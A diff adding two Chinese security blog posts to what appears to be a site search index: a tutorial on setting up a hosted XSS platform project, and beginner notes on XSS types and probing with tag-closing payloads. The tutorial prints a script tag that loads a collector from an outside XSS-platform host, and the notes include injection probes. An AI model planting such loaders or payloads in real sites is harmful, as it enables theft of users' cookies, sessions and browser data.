@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>XSS平台注册后使用方法</title>
+      <link href="/posts/48491.html"/>
+      <url>/posts/48491.html</url>
+      
+        <content type="html"><![CDATA[<p><del>以前以为XSS平台就是一个靶场，没啥卵用；注册了账号也不会使用，完全搞不懂项</del>目创建了是干啥的，各种模块参数完全搞不懂要怎么使用；<del>经过今晚的学习已经了解XSS平台的基本使用方法，</del></p><p>首先注册一个账号，</p><p><strong>创建项目</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012407.png" alt=""></p><p><strong>填写项目名称以及项目描述</strong></p><p>可以随意填写</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012905.png" alt=""></p><p><strong>勾选模块</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012947.png" alt=""></p><p>点击完成之后，然后就会来到项目代码界面</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013039.png" alt=""></p><p>复制红色框中的代码。</p><pre><code>&lt;script src=https://xss.chinacycc.com/d05AkE&gt;&lt;/script&gt; </code></pre><p>桌面新建一个叫做 XSS.html后缀的文件。将红色框中的代码写入。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013437.png" alt=""></p><p>这里记得一定要新建为 html格式，有得人新建的是txt格式。 然后使用浏览器打开xss.html. xss平台就会收到你的信息。方可算是成功！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013810.png" alt=""></p><p>XSS后台获取到浏览器信息，整个使用流程就结束了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS漏洞笔记</title>
+      <link href="/posts/29659.html"/>
+      <url>/posts/29659.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>它允许黑客将代码注入网页，其它用户在浏览网页时会受到影响。黑客利用XSS代码攻击成功后，可能得到一些很高的权限（如执行一些黑客本来不具备的操作）私密网页内容、获取内网IP、会话、Cookie、网页截图等各式各样的内容。</p><blockquote><p><strong>XSS攻击分为三种：</strong><br>存储型：<br>又称持久型XSS，黑客插入的攻击脚本将永久的存放在目标服务器的数据库中或文件中，具有很高的隐蔽性能。</p><p><code>只需要坐等不需要和用户交互，用户打开我们植入恶意代码的网页，就凉凉</code></p><p>反射型：<br>又称非持久型XSS，这种攻击方式往往只有一次性。</p><p><code>必须要和用户进行交互，必须用户打开你的一个链接</code></p><p>DOM型：<br>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM对象模型的一种漏洞。</p></blockquote><ul><li><p>输入和输出</p></li><li><h3 id="只要任何你输入的内容输出到了页面并且输入的内容可控，那么都可以测试XSS漏洞"><a href="#只要任何你输入的内容输出到了页面并且输入的内容可控，那么都可以测试XSS漏洞" class="headerlink" title="只要任何你输入的内容输出到了页面并且输入的内容可控，那么都可以测试XSS漏洞"></a>只要任何你输入的内容输出到了页面并且输入的内容可控，那么都可以测试XSS漏洞</h3></li></ul><blockquote><p>我们应该怎样合法的去测试呢？？</p></blockquote><h4 id="不要去弹窗！！！"><a href="#不要去弹窗！！！" class="headerlink" title="不要去弹窗！！！"></a>不要去弹窗！！！</h4><pre><code>&lt;img src="1"&gt;</code></pre><p>如果说，网页能运行这个img标签，那么它基本也能运行Java Srcipt代码   <code>&lt;srcipt src="URL"&gt;&lt;/srcipt&gt;</code>基本上都可以运行这个。</p><p>避免使用这串弹框代码<code>&lt;srcipt&gt;alert("1")&lt;/srcipt&gt;</code></p><h5 id="！！！在测试的时候尽可能加上闭合符"><a href="#！！！在测试的时候尽可能加上闭合符" class="headerlink" title="！！！在测试的时候尽可能加上闭合符"></a>！！！在测试的时候尽可能加上闭合符</h5><p><code>"&gt;</code>       示例<code>"&gt;&lt;img src="1"&gt;</code></p><p>闭合前方的代码，去执行我们的代码，，所以在测试的时候一定能够要加闭合符</p><p>我们再插入JS代码的时候不加闭合符，很有可能破坏原有网页代码的结构体，导致网页出错。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CSRF漏洞的验证与防御</title>
       <link href="/posts/27182.html"/>
       <url>/posts/27182.html</url>
